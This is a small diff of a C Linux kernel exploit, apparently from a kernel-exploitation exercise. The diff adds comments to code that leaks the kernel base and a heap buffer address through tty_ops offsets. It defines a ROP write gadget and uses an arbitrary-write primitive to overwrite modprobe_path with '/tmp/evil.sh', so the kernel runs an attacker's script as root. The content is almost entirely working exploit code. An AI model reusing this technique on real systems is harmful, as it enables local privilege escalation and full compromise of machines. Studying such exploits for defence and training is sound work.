@@ -6,7 +6,7 @@
 #include <unistd.h>
 
 #define ofs_tty_ops 0xc38880
-#define addr_modprobe_path (kbase + 0xe38180)
+#define addr_modprobe_path (kbase + 0xe38180)   // "/sbin/modprobe"
 #define rop_mov_prdx_rcx (kbase + 0x0477f7)     // mov qword [rdx], rcx; ret;
 
 unsigned long kbase, g_buf;
@@ -59,6 +59,7 @@ int main() {
   g_buf = *(unsigned long*)&buf[0x438] - 0x438;
   printf("[+] g_buf = 0x%016lx\n", g_buf);
 
+  // overwrite modprobe_path
   char cmd[] = "/tmp/evil.sh";
   for (int i = 0; i < sizeof(cmd); i += 4) {
     AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
